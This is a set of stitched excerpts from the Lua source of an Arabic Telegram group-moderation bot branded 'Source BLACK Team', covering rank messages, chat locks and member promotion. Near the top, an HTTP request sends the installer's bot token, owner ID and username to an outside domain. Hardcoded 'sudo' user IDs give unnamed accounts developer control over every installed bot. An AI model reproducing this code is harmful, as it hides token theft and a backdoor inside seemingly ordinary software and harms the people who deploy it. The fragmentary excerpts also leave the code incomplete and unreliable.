...
https.request('http://karax.ga/BLACK/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
...
sudo_users = {SUDO,665877797,633868576,907554334}
...
var = true  
elseif tonumber(user_id) == tonumber(633868576) then
var = true  
...
BLACK_Msg = 'اسد التفاعل 🕊️' 
elseif msgs < 7000 then 
BLACK_Msg = 'ملك التفاعل🌛' 
elseif msgs < 9500 then 
BLACK_Msg = 'احلا تفاعل 🌞' 
...
function plugin_BLACKa(msg)
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.BLACKa and msg then
pre_msg = plugin.BLACKa(msg)
end
end
end
...
usertext = '\n🔰┇ العضو » ['..result.title_..'](t.me/'..(username or 'II_II_II')..')'
...
usertext = '\n🔰┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'II_II_II')..')'
status  = '\n〽️┇ تم ترقيته مطور في البوت'
...
if BLACK1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'🔰┇ العضو ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'II_II_II')..') \n 📬┇'..BLACK1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
send(msg.chat_id_,0,"⚠┇العضو : {["..data.first_name_.."](T.ME/II_II_II)}\n🚫┇["..BLACK_Msg.."] \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, "⚠┇عذرا يا » {["..data.first_name_.."](T.ME/II_II_II)}\n📮┇ الملصق الذي ارسلته تم منعه من المجموعه \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
📡 ┇Source BLACK Team
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
📥┇[Channel BLACK](t.me/II_II_II) 

🔎┇[Information](t.me/II_II_II)
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'🔰┇ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'II_II_II')..') \n〽️┇ تـم قفـل الدردشه\n⛔┇ الحاله ← المسح ')  
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'🔰┇ بواسطه ← ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'II_II_II')..') \n〽️┇ تـم قفـل التاك بالكتم\n⛔┇ الحاله ←الكتم ')  
end,nil)   
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n🔰┇ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'II_II_II')..')'..'\n〽️┇ تم رفعه '..text1[2]..' هنا')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
datahso:del(bot_id..'help_text')
datahso:del(bot_id..'help1_text')
datahso:del(bot_id..'help2_text')
datahso:del(bot_id..'help3_text')
datahso:del(bot_id..'help4_text')
datahso:del(bot_id..'help5_text')
datahso:del(bot_id..'help6_text')
datahso:del(bot_id..'help7_text')
datahso:del(bot_id..'help8_text')
datahso:del(bot_id..'help9_text')
datahso:del(bot_id..'help10_text')
